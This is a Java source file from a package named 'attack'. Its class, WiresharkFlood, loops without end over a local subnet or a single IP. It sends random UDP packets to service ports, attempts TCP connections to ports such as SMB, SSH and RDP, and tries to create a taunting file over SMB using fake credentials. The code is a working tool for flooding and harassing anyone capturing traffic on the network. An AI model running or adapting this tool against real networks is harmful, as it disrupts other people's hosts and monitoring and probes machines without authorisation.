package attack;

import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbFile;
import utils.LoggingUtils;

import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class WiresharkFlood extends LoggingUtils {

    final List<Integer> udpPorts = Arrays.asList(500, 4500, 1194, 123, 53, 67, 68, 5355, 137, 138);
    // In order: L2TP/IPSec/IKEv2 (x2), OpenVPN, NTP, DNS, DHCP (x2), LLMNR, NBS, BROWSER

    final List<Integer> tcpPorts = Arrays.asList(445, 80, 443, 22, 25, 23, 143, 3389, 110);
    // In order: SMB, HTTP, HTTPS, SSH, SMTP, TELNET, IMAP, RDP, POP3

    public WiresharkFlood(final String specificIPv4, final int delay) throws IOException, InterruptedException {

        final int threadDelay = delay == -1 ? Integer.parseInt(getUserInput("What should be the delay between each packet wave ? (1000 recommended)")) : delay;

        while (true) {

            for (int i = 0; i <= 254; i++) {

                final String ipAddress = specificIPv4 == null ? "192.168.1." + i : specificIPv4;

                // UDP
                byte[] udpBytes = new byte[1];
                new Random().nextBytes(udpBytes);

                final DatagramSocket udpSocket = new DatagramSocket();
                final DatagramPacket udpPacket
                        = new DatagramPacket(udpBytes, udpBytes.length, InetAddress.getByName(ipAddress), getRandomElement(udpPorts));
                udpSocket.send(udpPacket);
                udpSocket.close();
                //-------------------------

                // TCP
                try {
                    new Socket().connect(new InetSocketAddress(ipAddress, getRandomElement(tcpPorts)), 1);
                } catch (final IOException ignored) {}


                // SMB - Connection
                try {
                    new SmbFile("smb://" + ipAddress + "/WIRESHARK_SNIFFER.DETECTED", new NtlmPasswordAuthentication(null, "STOP_SNIFFING", "YOU_GOT_CAUGHT")).createNewFile();
                } catch (final IOException ignored) {}

                Thread.sleep(threadDelay);
            }

        }

    }

    public Integer getRandomElement(final List<Integer> list) {
        return list.get(new Random().nextInt(list.size()));
    }
}
